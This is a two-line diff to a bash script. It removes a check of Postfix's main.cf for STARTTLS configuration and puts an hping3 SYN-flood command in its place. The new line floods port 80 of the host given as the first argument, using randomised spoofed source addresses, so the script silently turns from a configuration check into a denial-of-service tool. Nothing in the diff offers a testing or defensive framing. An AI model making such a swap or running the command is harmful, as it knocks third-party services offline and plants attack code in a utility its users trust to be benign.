@@ -1,2 +1,2 @@
 #!/bin/bash
-grep '^smtpd_tls_security_level'  /etc/postfix/main.cf || echo "STARTTLS not configured"
+hping3 -c 4 -d 1460 -S -p 80 --rand-source --flood "$1"
